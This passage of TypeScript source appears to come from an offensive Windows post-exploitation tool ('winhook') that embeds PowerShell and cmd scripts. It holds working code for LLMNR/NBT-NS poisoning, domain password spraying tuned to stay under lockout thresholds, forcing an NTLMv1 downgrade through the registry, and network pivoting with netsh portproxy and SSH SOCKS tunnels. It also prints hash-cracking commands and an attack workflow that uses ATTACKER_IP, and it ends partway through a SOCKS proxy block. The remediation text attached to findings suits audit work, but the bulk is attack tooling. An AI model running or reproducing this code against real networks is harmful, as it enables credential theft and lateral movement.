      $resp.Add(0x00); $resp.Add(0x01)  # TYPE = A (1)
      $resp.Add(0x00); $resp.Add(0x01)  # CLASS = IN (1)
      $resp.Add(0x00); $resp.Add(0x00); $resp.Add(0x00); $resp.Add(0x1E)  # TTL = 30s
      $resp.Add(0x00); $resp.Add(0x04)  # RDLENGTH = 4
      foreach ($b in $ipBytes) { $resp.Add($b) }

      $respBytes = $resp.ToArray()
      $llmnrSocket.Send($respBytes, $respBytes.Length, $remoteEP) | Out-Null
      $poisonedCount++
      Write-Output "  [>] Poisoned: $queriedName -> $ourIP (sent to $($remoteEP.Address))"
    } catch [System.Net.Sockets.SocketException] {
      # Receive timeout — normal
    } catch {
      Write-Output "  [!] Error: $_"
    }
  }
  Start-Sleep -Milliseconds 50
}

Write-Output ""
Write-Output "=== Poisoning Summary ==="
Write-Output "Duration: ${duration}s"
Write-Output "Queries captured: $queryCount"
Write-Output "Poisoned responses sent: $poisonedCount"
Write-Output ""
if ($queryCount -gt 0) {
  Write-Output "Clients that queried are now connecting to $ourIP"
  Write-Output "Capture their NTLMv2 hashes: winhook ntlm_relay --action relay --listen-port 445"
}

if ($llmnrSocket) { $llmnrSocket.Close() }
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    const queryMatch = r.stdout.match(/Queries captured: (\d+)/)
    if (queryMatch && parseInt(queryMatch[1]) > 0) {
      findings.push({
        checkId: "POISON-002",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "Network",
        title: `Captured ${queryMatch[1]} broadcast name resolution queries`,
        details: "Network hosts are making LLMNR/NBT-NS queries susceptible to poisoning attacks",
        remediation: "Disable LLMNR and NBT-NS across the domain via Group Policy.",
      })
    }
  }

  if (action === "analyze") {
    const script = `
Write-Output "=== Broadcast Poisoning Risk Analysis ==="
Write-Output ""
# Check what names are being queried on the network
Write-Output "--- Recent DNS Client Cache (potential poisoning targets) ---"
$cache = Get-DnsClientCache | Where-Object { $_.Status -eq 9003 }
if ($cache) {
  Write-Output "Failed DNS lookups (fallback to LLMNR/NBT-NS):"
  foreach ($c in ($cache | Select-Object -First 20)) {
    Write-Output "  $($c.Entry) — Status: $($c.Status) (Name not found → broadcast)"
  }
  Write-Output ""
  Write-Output "These names could not be resolved via DNS and will trigger LLMNR/NBT-NS"
  Write-Output "A poisoner would capture NTLMv2 hashes from hosts trying to resolve these"
} else {
  Write-Output "No failed DNS lookups in cache"
}
Write-Output ""
Write-Output "--- Common Poisoning Targets ---"
Write-Output "WPAD — Web Proxy Auto-Discovery (very common, high value)"
Write-Output "ISATAP — Intra-Site Automatic Tunnel Addressing Protocol"
Write-Output "Typos of internal hostnames"
Write-Output "Legacy NetBIOS names"
Write-Output ""
Write-Output "--- NTLMv2 Hash Cracking Feasibility ---"
Write-Output "NTLMv2 hashes captured via poisoning can be cracked with:"
Write-Output "  hashcat -m 5600 hashes.txt wordlist.txt"
Write-Output "  john --format=netntlmv2 hashes.txt"
Write-Output "  Weak passwords: seconds to minutes"
Write-Output "  Strong passwords: may require relay instead (winhook ntlm_relay)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function passwordSpray(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "policy"
  const password = argVal(args, "--password")
  const users = argVal(args, "--users") || "all"
  const dc = argVal(args, "--dc")
  const jitter = argVal(args, "--jitter") || "2"
  const margin = argVal(args, "--threshold-margin") || "2"
  const findings: Finding[] = []
  const output: string[] = ["[*] Domain password spraying...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Password Spray (cmd.exe) ===\n")
    if (action === "policy") {
      output.push("[*] Querying domain password policy...")
      const nltest = await cmd("nltest /dsgetdc:", timeout)
      const dcName = nltest.stdout.match(/DC: \\\\(.+)/)?.[1]?.trim()
      output.push(dcName ? `[+] DC: ${dcName}` : "[!] Cannot determine DC")
      const policy = await cmd("net accounts /domain 2>nul", timeout)
      output.push(
        policy.exitCode === 0
          ? `\n[+] Domain password policy:\n${policy.stdout}`
          : `\n[!] net accounts failed: ${policy.stderr}`,
      )
      const lockout = policy.stdout.match(/Lockout threshold:\s+(\d+)/)?.[1]
      if (lockout) {
        output.push(
          `\n[*] Safe spray: use threshold minus ${margin} = max ${parseInt(lockout) - parseInt(margin)} attempts per user`,
        )
        findings.push({
          checkId: "WIN-SPRAY-001",
          provider: "windows",
          severity: "medium",
          status: "ENUMERATED",
          resource: "domain://policy",
          title: `Domain lockout threshold: ${lockout}`,
          details: `Password spray safe up to ${parseInt(lockout) - parseInt(margin)} attempts`,
          remediation: "Enforce strong passwords and MFA",
        })
      }
    }
    if (action === "spray") {
      if (!password) {
        output.push("[!] Required: --password <password>")
        return { output: output.join("\n"), findings }
      }
      output.push("[!] Active spraying via cmd.exe uses net use (noisy, logs Event 4625)")
      output.push(`[*] Password: ${password}`)
      output.push("[*] Spraying via net use against DC...")
      const userList = await cmd(
        'net user /domain 2>nul | findstr /v /c:"---" /c:"The command" /c:"User accounts"',
        timeout,
      )
      const userNames = userList.stdout
        .trim()
        .split(/\s+/)
        .filter((u) => u.length > 1)
        .slice(0, 20)
      output.push(`[*] Testing ${userNames.length} users...`)
      for (const u of userNames) {
        const r = await cmd(`net use \\\\${dc || "localhost"}\\IPC$ /user:${u} "${password}" 2>&1`, timeout)
        if (r.exitCode === 0 || r.stdout.includes("command completed")) {
          output.push(`[+] SUCCESS: ${u}:${password}`)
          await cmd(`net use \\\\${dc || "localhost"}\\IPC$ /delete /y 2>nul`, timeout)
          findings.push({
            checkId: `WIN-SPRAY-${findings.length + 1}`,
            provider: "windows",
            severity: "critical",
            status: "EXTRACTED",
            resource: `user://${u}`,
            title: `Valid credential: ${u}`,
            details: `Password spray success with: ${password}`,
            remediation: "Force password reset for this user",
          })
        }
      }
    }
    if (action === "status") {
      output.push("[*] Account lockout status:")
      const locked = await cmd(
        'net user /domain 2>nul | findstr /v /c:"---" /c:"The command" /c:"User accounts"',
        timeout,
      )
      output.push(locked.stdout.trim() ? `Users:\n${locked.stdout}` : "[-] Cannot enumerate users")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "policy") {
    const script = `
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
Write-Output "=== Domain Password Policy ==="
Write-Output "Domain: $($domain.Name)"
$root = [ADSI]"LDAP://$($domain.Name)"
$lockoutThreshold = $root.Properties["lockoutThreshold"].Value
$lockoutDuration = [timespan]::FromTicks([math]::Abs($root.Properties["lockoutDuration"].Value)).TotalMinutes
$lockoutWindow = [timespan]::FromTicks([math]::Abs($root.Properties["lockoutObservationWindow"].Value)).TotalMinutes
$minPwdLength = $root.Properties["minPwdLength"].Value
$pwdHistory = $root.Properties["pwdHistoryLength"].Value
$complexity = $root.Properties["pwdProperties"].Value
Write-Output "Lockout Threshold: $lockoutThreshold attempts"
Write-Output "Lockout Duration: $lockoutDuration minutes"
Write-Output "Observation Window: $lockoutWindow minutes"
Write-Output "Min Password Length: $minPwdLength"
Write-Output "Password History: $pwdHistory"
Write-Output "Complexity Required: $(if ($complexity -band 1) {'Yes'} else {'No'})"
Write-Output ""
if ($lockoutThreshold -eq 0) {
  Write-Output "STATUS: NO LOCKOUT POLICY — unlimited spray attempts possible"
} else {
  Write-Output "STATUS: Lockout after $lockoutThreshold attempts, resets after $lockoutWindow minutes"
  Write-Output "SAFE SPRAY: Use threshold-margin of 2, spray $(($lockoutThreshold - 2)) attempts max"
  Write-Output "WAIT TIME: $lockoutWindow minutes between spray rounds"
}
# Count enabled users
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$searcher.PageSize = 1000
$users = $searcher.FindAll()
Write-Output ""
Write-Output "Enabled domain users: $($users.Count)"
# Fine-grained password policies
$searcher.Filter = "(objectClass=msDS-PasswordSettings)"
$fgpp = $searcher.FindAll()
if ($fgpp.Count -gt 0) {
  Write-Output ""
  Write-Output "=== Fine-Grained Password Policies ==="
  foreach ($p in $fgpp) {
    Write-Output "Policy: $($p.Properties['cn'][0])"
    Write-Output "  Lockout Threshold: $($p.Properties['msds-lockoutthreshold'][0])"
    Write-Output "  Applies To: $($p.Properties['msds-psoappliesto'] -join ', ')"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("NO LOCKOUT POLICY")) {
      findings.push({
        checkId: "SPRAY-001",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "Domain Password Policy",
        title: "No account lockout policy configured",
        details: "Domain has no lockout threshold — unlimited password spray attempts possible",
        remediation: "Configure account lockout threshold in Group Policy.",
      })
    }
  }

  if (action === "spray") {
    if (!password) {
      output.push("ERROR: --password required for spray action")
      return { output: output.join("\n"), findings }
    }
    const dcParam = dc
      ? `$dc = '${dc}'`
      : `$dc = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name`
    const userFilter =
      users === "all"
        ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"`
        : `$userList = Get-Content '${users}'; $searcher = $null`
    const script = `
${dcParam}
Write-Output "=== Password Spray ==="
Write-Output "Target DC: $dc"
Write-Output "Password: ${"*".repeat(8)}"
Write-Output "Jitter: ${jitter}s between attempts"
Write-Output "Threshold Margin: ${margin}"
Write-Output ""
# Get lockout policy
$root = [ADSI]"LDAP://$($([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name)"
$lockoutThreshold = [int]$root.Properties["lockoutThreshold"].Value
$safeAttempts = if ($lockoutThreshold -gt 0) { $lockoutThreshold - ${margin} } else { 999999 }
Write-Output "Lockout threshold: $lockoutThreshold, Safe attempts per user: $safeAttempts"
Write-Output ""
# Get users
${userFilter}
if ($searcher) {
  $searcher.PageSize = 1000
  $searcher.PropertiesToLoad.Add("sAMAccountName") | Out-Null
  $userList = $searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"][0] }
}
Write-Output "Spraying against $($userList.Count) users..."
Write-Output ""
$hits = @()
$tested = 0
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain)
foreach ($u in $userList) {
  $tested++
  try {
    $valid = $ctx.ValidateCredentials($u, '${password.replace(/'/g, "''")}')
    if ($valid) {
      Write-Output "[+] HIT: $u : ${password.replace(/'/g, "''")}"
      $hits += $u
    }
  } catch {
    # Account locked or other error
    if ($_.Exception.Message -match 'locked') {
      Write-Output "[!] LOCKED: $u"
    }
  }
  if ($tested % 50 -eq 0) {
    Write-Output "[*] Progress: $tested / $($userList.Count)"
  }
  Start-Sleep -Milliseconds (${jitter} * 1000 + (Get-Random -Maximum 1000))
}
Write-Output ""
Write-Output "=== Results ==="
Write-Output "Tested: $tested users"
Write-Output "Hits: $($hits.Count)"
foreach ($h in $hits) {
  Write-Output "  VALID: $h"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    const hitMatches = r.stdout.match(/\[+\+\] HIT: .+/g) || []
    for (const hit of hitMatches) {
      findings.push({
        checkId: "SPRAY-002",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: hit.replace("[+] HIT: ", "").split(" :")[0],
        title: "Valid credentials found via password spray",
        details: hit,
        remediation: "Enforce strong unique passwords and enable MFA.",
      })
    }
  }

  if (action === "status") {
    const script = `
Write-Output "=== Account Lockout Status ==="
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(lockoutTime>=1))"
$searcher.PageSize = 1000
$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","lockoutTime","badPwdCount","badPasswordTime"))
$locked = $searcher.FindAll()
Write-Output "Currently locked accounts: $($locked.Count)"
foreach ($a in $locked) {
  $lockTime = [DateTime]::FromFileTime([Int64]$a.Properties["lockouttime"][0])
  Write-Output "  $($a.Properties['samaccountname'][0]) — locked at $lockTime (bad attempts: $($a.Properties['badpwdcount'][0]))"
}
# Show accounts with recent bad password attempts
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(badPwdCount>=1)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$badPwd = $searcher.FindAll()
Write-Output ""
Write-Output "Accounts with recent bad password attempts: $($badPwd.Count)"
foreach ($a in ($badPwd | Select-Object -First 20)) {
  Write-Output "  $($a.Properties['samaccountname'][0]) — $($a.Properties['badpwdcount'][0]) bad attempts"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function ntlmv1Downgrade(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const level = argVal(args, "--level") || "0"
  const target = argVal(args, "--target")
  const findings: Finding[] = []
  const output: string[] = ["[*] NTLMv1 downgrade analysis...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== NTLMv1 Downgrade (cmd.exe) ===\n")
    const lsaKey = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
    if (action === "check") {
      const lm = await cmd(`reg query "${lsaKey}" /v LmCompatibilityLevel 2>nul`, timeout)
      const lmVal = lm.stdout.match(/LmCompatibilityLevel\s+REG_DWORD\s+0x(\w+)/)?.[1]
      const lmLevel = lmVal ? parseInt(lmVal, 16) : -1
      const levels: Record<number, string> = {
        0: "Send LM & NTLM (most vulnerable)",
        1: "LM & NTLM, use NTLMv2 session if negotiated",
        2: "Send NTLM only",
        3: "Send NTLMv2 only (default)",
        4: "NTLMv2 only, refuse LM on DC",
        5: "NTLMv2 only, refuse LM & NTLM (most secure)",
      }
      output.push(`LmCompatibilityLevel: ${lmLevel === -1 ? "NOT SET (default=3)" : lmLevel}`)
      output.push(`Meaning: ${levels[lmLevel] || levels[3]}`)
      if (lmLevel >= 0 && lmLevel < 3) {
        output.push(`\n[!] VULNERABLE: NTLMv1 is accepted — hashes crackable via rainbow tables`)
        findings.push({
          checkId: "WIN-NTLM-001",
          provider: "windows",
          severity: "critical",
          status: "FAIL",
          resource: lsaKey,
          title: `NTLMv1 enabled (level ${lmLevel})`,
          details: levels[lmLevel],
          remediation: "Set LmCompatibilityLevel to 5",
        })
      }
      const noLM = await cmd(`reg query "${lsaKey}" /v NoLMHash 2>nul`, timeout)
      output.push(
        `\nNoLMHash: ${noLM.stdout.includes("0x1") ? "1 (LM hashes not stored)" : "0 or not set (LM hashes may be stored)"}`,
      )
      const ntlmMinSec = await cmd(`reg query "${lsaKey}\\MSV1_0" /v NtlmMinServerSec 2>nul`, timeout)
      output.push(`NtlmMinServerSec: ${ntlmMinSec.stdout.match(/0x\w+/)?.[0] || "not set"}`)
    }
    if (action === "downgrade") {
      output.push(`[*] Setting LmCompatibilityLevel to ${level}...`)
      const r = await cmd(`reg add "${lsaKey}" /v LmCompatibilityLevel /t REG_DWORD /d ${level} /f`, timeout)
      output.push(r.exitCode === 0 ? `[+] LmCompatibilityLevel set to ${level}` : `[!] Failed: ${r.stderr}`)
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-NTLM-002",
          provider: "windows",
          severity: "critical",
          status: "EXECUTED",
          resource: lsaKey,
          title: `NTLMv1 downgrade applied (level ${level})`,
          details: "LmCompatibilityLevel changed",
          remediation: "Restore to level 5",
        })
    }
    if (action === "restore") {
      const r = await cmd(`reg add "${lsaKey}" /v LmCompatibilityLevel /t REG_DWORD /d 3 /f`, timeout)
      output.push(r.exitCode === 0 ? "[+] LmCompatibilityLevel restored to 3" : `[!] Failed: ${r.stderr}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
Write-Output "=== NTLM Authentication Level ==="
Write-Output ""

# LmCompatibilityLevel determines NTLM version
$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$lmLevel = (Get-ItemProperty $lsaKey -Name LmCompatibilityLevel -ErrorAction SilentlyContinue).LmCompatibilityLevel

$levels = @{
  0 = 'Send LM & NTLM responses (most vulnerable)'
  1 = 'Send LM & NTLM — use NTLMv2 session security if negotiated'
  2 = 'Send NTLM response only'
  3 = 'Send NTLMv2 response only (default for modern Windows)'
  4 = 'Send NTLMv2 response only — refuse LM on DC'
  5 = 'Send NTLMv2 response only — refuse LM & NTLM on DC (most secure)'
}

$current = if ($lmLevel -ne $null) { $lmLevel } else { 3 }
Write-Output "LmCompatibilityLevel: $current"
Write-Output "Description: $($levels[$current])"
Write-Output "LM_LEVEL=$current"
Write-Output ""

if ($current -le 2) {
  Write-Output "[!] NTLMv1 or LM responses are ALREADY sent"
  Write-Output "[!] Captured hashes can be cracked trivially"
  Write-Output "ALREADY_WEAK=1"
} else {
  Write-Output "[*] NTLMv2 is enforced — captured hashes require bruteforce"
  Write-Output "[*] Downgrade to level 0-2 to enable NTLMv1 (instantly crackable)"
  Write-Output "ALREADY_WEAK=0"
}

# Check GPO enforcement
Write-Output ""
Write-Output "=== GPO Enforcement ==="
$gpKey = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System'
$gpLm = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\DefaultMediaCost' -ErrorAction SilentlyContinue)
$gpLsa = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -ErrorAction SilentlyContinue)

# Check if GPO overrides local setting
$gpLmLevel = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name LmCompatibilityLevel -ErrorAction SilentlyContinue).LmCompatibilityLevel
if ($gpLmLevel -ne $null) {
  Write-Output "GPO-enforced LmCompatibilityLevel: $gpLmLevel"
  Write-Output "[!] GPO override active — local registry changes may be reverted by GP refresh"
  Write-Output "GPO_ENFORCED=1"
} else {
  Write-Output "No GPO override — local registry changes will persist"
  Write-Output "GPO_ENFORCED=0"
}

# NTLMv1 cracking speed context
Write-Output ""
Write-Output "=== Cracking Speed Comparison ==="
Write-Output "NTLMv1:  DES-based, 2^56 key space — rainbow tables exist, crack in SECONDS"
Write-Output "NTLMv2:  HMAC-MD5 with challenge — NO rainbow tables, requires BRUTEFORCE"
Write-Output ""
Write-Output "NTLMv1 capture → crack.sh or ntlmv1-multi tool → plaintext in seconds"
Write-Output "NTLMv2 capture → hashcat mode 5600 → hours/days depending on password"

# Check for Extended Protection for Authentication (EPA)
Write-Output ""
$epa = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name SuppressExtendedProtection -ErrorAction SilentlyContinue)
Write-Output "Extended Protection: $(if ($epa.SuppressExtendedProtection -eq 1) { 'DISABLED (relay easier)' } else { 'Enabled or default' })"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const lmLevel = r.stdout.match(/LM_LEVEL=(\d)/)
    const alreadyWeak = r.stdout.includes("ALREADY_WEAK=1")

    if (alreadyWeak) {
      findings.push({
        checkId: "WIN-NTLM-001",
        provider: "windows",
        severity: "critical",
        status: "WEAK",
        resource: "lsa://lm-compatibility",
        title: `NTLMv1/LM responses enabled (level ${lmLevel ? lmLevel[1] : "??"})`,
        details:
          "Machine sends NTLMv1 or LM responses. Captured hashes can be cracked in seconds using rainbow tables or DES key recovery.",
        remediation: "Set LmCompatibilityLevel to 5 (NTLMv2 only, refuse LM & NTLM).",
      })
    }
  }

  if (action === "downgrade") {
    const script = `
Write-Output "=== NTLMv1 Downgrade ==="
Write-Output ""

$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$current = (Get-ItemProperty $lsaKey -Name LmCompatibilityLevel -ErrorAction SilentlyContinue).LmCompatibilityLevel
$currentVal = if ($current -ne $null) { $current } else { 3 }
Write-Output "Current LmCompatibilityLevel: $currentVal"

$targetLevel = ${level}
Write-Output "Target LmCompatibilityLevel: $targetLevel"
Write-Output ""

Set-ItemProperty $lsaKey -Name LmCompatibilityLevel -Value $targetLevel -Type DWord -Force
$verify = (Get-ItemProperty $lsaKey -Name LmCompatibilityLevel).LmCompatibilityLevel
Write-Output "[+] LmCompatibilityLevel set to: $verify"
Write-Output "PREVIOUS=$currentVal"
Write-Output ""

if ($verify -le 2) {
  Write-Output "[+] NTLMv1 responses are now enabled"
  Write-Output "[*] Takes effect immediately for NEW authentications"
  Write-Output ""
  Write-Output "[*] Attack workflow:"
  Write-Output "    1. Start listener: winhook ntlm_relay --action relay"
  Write-Output "    2. Coerce auth: winhook ntlm_coerce --target TARGET --listener ATTACKER_IP"
  Write-Output "    3. Captured NTLMv1 hash → crack instantly"
  Write-Output ""
  Write-Output "    Crack NTLMv1:"
  Write-Output "    - crack.sh (https://crack.sh) — free online NTLMv1 cracker"
  Write-Output "    - ntlmv1-multi — convert to DES keys for hashcat mode 14000"
  Write-Output "    - hashcat -m 5500 — NTLMv1 (slower than DES conversion)"
} else {
  Write-Output "[*] Level $verify still uses NTLMv2 — set to 0 or 2 for NTLMv1"
}

Write-Output ""
Write-Output "Restore: winhook ntlmv1_downgrade --action restore"
Write-Output "STATUS=SUCCESS"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      const prev = r.stdout.match(/PREVIOUS=(\d)/)
      findings.push({
        checkId: "WIN-NTLM-010",
        provider: "windows",
        severity: "critical",
        status: "DOWNGRADED",
        resource: "lsa://lm-compatibility",
        title: `NTLMv1 downgrade applied (${prev ? prev[1] : "3"} → ${level})`,
        details: `LmCompatibilityLevel set to ${level}. All new NTLM authentications from this machine will use NTLMv1, which cracks in seconds.`,
        remediation: `Restore: winhook ntlmv1_downgrade --action restore (back to ${prev ? prev[1] : "3"})`,
      })
    }
  }

  if (action === "restore") {
    const script = `
Write-Output "=== Restoring NTLMv2 ==="
$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
Set-ItemProperty $lsaKey -Name LmCompatibilityLevel -Value 3 -Type DWord -Force
$verify = (Get-ItemProperty $lsaKey -Name LmCompatibilityLevel).LmCompatibilityLevel
Write-Output "[+] LmCompatibilityLevel restored to: $verify (NTLMv2 only)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function proxyPivot(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const listenPort = argVal(args, "--listen-port") || "1080"
  const targetAddr = argVal(args, "--target")
  const sshHost = argVal(args, "--ssh-host")
  const sshUser = argVal(args, "--ssh-user") || "root"
  const findings: Finding[] = []
  const output: string[] = ["[*] Network pivoting operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Network Pivoting (cmd.exe) ===\n")
    if (action === "enum") {
      output.push("[*] Network interfaces:")
      const ipconfig = await cmd("ipconfig /all", timeout)
      output.push(ipconfig.stdout)
      output.push("[*] Routing table:")
      const route = await cmd("route print", timeout)
      output.push(route.stdout)
      output.push("[*] ARP table:")
      const arp = await cmd("arp -a", timeout)
      output.push(arp.stdout)
      output.push("[*] Active connections:")
      const netstat = await cmd("netstat -ano | findstr ESTABLISHED", timeout)
      output.push(netstat.stdout)
      output.push("\n[*] Port forwarding rules:")
      const portproxy = await cmd("netsh interface portproxy show all", timeout)
      output.push(portproxy.stdout.trim() || "    None configured")
      output.push("\n[*] Available tools:")
      const ssh = await cmd("where ssh 2>nul", timeout)
      const plink = await cmd("where plink 2>nul", timeout)
      output.push(ssh.exitCode === 0 ? "    [+] ssh.exe available" : "    [-] ssh.exe not found")
      output.push(plink.exitCode === 0 ? "    [+] plink.exe available" : "    [-] plink.exe not found")
      findings.push({
        checkId: "WIN-PIVOT-001",
        provider: "windows",
        severity: "info",
        status: "ENUMERATED",
        resource: "network://pivot",
        title: "Network pivot capability enumeration",
        details: "Interfaces, routes, and tool availability checked",
        remediation: "Segment networks. Restrict lateral movement.",
      })
    }
    if (action === "portproxy") {
      if (!targetAddr) {
        output.push("[!] Required: --target HOST:PORT")
        return { output: output.join("\n"), findings }
      }
      const parts = targetAddr.split(":")
      output.push(`[*] Setting up netsh portproxy: 0.0.0.0:${listenPort} → ${targetAddr}`)
      const r = await cmd(
        `netsh interface portproxy add v4tov4 listenport=${listenPort} listenaddress=0.0.0.0 connectport=${parts[1] || "445"} connectaddress=${parts[0]}`,
        timeout,
      )
      output.push(
        r.exitCode === 0 ? `[+] Port forward active: 0.0.0.0:${listenPort} → ${targetAddr}` : `[!] Failed: ${r.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-PIVOT-002",
          provider: "windows",
          severity: "high",
          status: "EXECUTED",
          resource: `portproxy://${listenPort}`,
          title: `Port forward via netsh portproxy`,
          details: `0.0.0.0:${listenPort} → ${targetAddr}`,
          remediation: "netsh interface portproxy delete v4tov4 listenport=" + listenPort + " listenaddress=0.0.0.0",
        })
    }
    if (action === "socks") {
      output.push("[!] SOCKS proxy requires external tools in cmd mode:")
      output.push("    ssh -D 1080 user@host (OpenSSH)")
      output.push("    plink.exe -D 1080 user@host (PuTTY)")
      output.push("    chisel.exe client <server>:8080 socks")
      output.push("    ligolo-ng (modern C2 tunnel)")
    }
    if (action === "reverse") {
      output.push("[*] Reverse port forward via netsh:")
      output.push(
        `    netsh interface portproxy add v4tov4 listenport=${listenPort} connectport=<remote_port> connectaddress=<remote_host>`,
      )
      output.push("    Or: ssh -R <remote_port>:localhost:<local_port> user@attacker")
    }
    if (action === "ssh-tunnel" && sshHost) {
      output.push(`[*] SSH tunnel to ${sshHost}...`)
      const r = await cmd(`ssh -f -N -D ${listenPort} ${sshUser}@${sshHost}`, timeout)
      output.push(
        r.exitCode === 0 ? `[+] SOCKS proxy via SSH on port ${listenPort}` : `[!] SSH tunnel failed: ${r.stderr}`,
      )
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Pivot Capability Enumeration ==="
Write-Output ""

Write-Output "[*] Network interfaces:"
Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
    Where-Object { $_.IPAddress -ne '127.0.0.1' } |
    ForEach-Object {
        $gateway = (Get-NetRoute -InterfaceIndex $_.InterfaceIndex -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop
        Write-Output "    $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength) GW: $gateway"
    }

Write-Output ""
Write-Output "[*] Routing table (non-default):"
Get-NetRoute -ErrorAction SilentlyContinue |
    Where-Object { $_.DestinationPrefix -ne '0.0.0.0/0' -and $_.DestinationPrefix -ne '::/0' -and $_.DestinationPrefix -notmatch 'ff00|fe80|127\\.' } |
    Select-Object DestinationPrefix, NextHop, InterfaceAlias -Unique |
    Select-Object -First 20 |
    ForEach-Object { Write-Output "    $($_.DestinationPrefix) -> $($_.NextHop) ($($_.InterfaceAlias))" }

Write-Output ""
Write-Output "[*] Reachable subnets (ARP cache):"
Get-NetNeighbor -State Reachable -ErrorAction SilentlyContinue |
    Where-Object { $_.IPAddress -match '^\\d' } |
    Group-Object { $_.IPAddress -replace '\\d+$','' } |
    ForEach-Object { Write-Output "    $($_.Name)0/24 ($($_.Count) hosts)" }

Write-Output ""
Write-Output "[*] Pivot tools available:"
$openSSH = Get-Command ssh -ErrorAction SilentlyContinue
Write-Output "    OpenSSH client: $(if ($openSSH) { 'AVAILABLE' } else { 'NOT FOUND' })"
$netsh = Get-Command netsh -ErrorAction SilentlyContinue
Write-Output "    netsh portproxy: $(if ($netsh) { 'AVAILABLE' } else { 'NOT FOUND' })"
$plink = Get-Command plink -ErrorAction SilentlyContinue
Write-Output "    PuTTY plink: $(if ($plink) { 'AVAILABLE' } else { 'NOT FOUND' })"

Write-Output ""
Write-Output "[*] Current port proxies:"
$proxies = netsh interface portproxy show all 2>&1
if ($proxies -match 'Listen') { Write-Output $proxies } else { Write-Output "    None configured" }

Write-Output ""
Write-Output "[*] Dual-homed potential:"
$interfaces = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne '127.0.0.1' }
if ($interfaces.Count -gt 1) {
    Write-Output "[!] DUAL-HOMED — $($interfaces.Count) interfaces detected"
    Write-Output "[!] This host can pivot between networks"
    foreach ($i in $interfaces) {
        Write-Output "    $($i.InterfaceAlias): $($i.IPAddress)/$($i.PrefixLength)"
    }
} else {
    Write-Output "    Single interface — limited pivot capability"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PIVOT-001",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "network://pivot-capability",
      title: "Pivot capability assessment — interfaces, routes, tools, dual-homed check",
      details: r.stdout.substring(0, 500),
      remediation: "Segment networks. Restrict routing between security zones. Monitor for port forwarding activity.",
    })
  }

  if (action === "socks") {
    const script = `
Write-Output "=== SOCKS Proxy Setup ==="
Write-Output "[*] Listen port: ${listenPort}"
Write-Output ""

$openSSH = Get-Command ssh -ErrorAction SilentlyContinue
if ($openSSH) {
    Write-Output "[*] Method 1: OpenSSH Dynamic Port Forward (SOCKS5)"
    Write-Output "    Command: ssh -D ${listenPort} -N -f user@localhost"
    Write-Output "    This creates a SOCKS5 proxy on 0.0.0.0:${listenPort}"
    Write-Output ""
}

Write-Output "[*] Method 2: PowerShell SOCKS4 Proxy (built-in, no dependencies)"
Write-Output "[*] Starting lightweight SOCKS4 proxy on port ${listenPort}..."
Write-Output ""

Add-Type @"
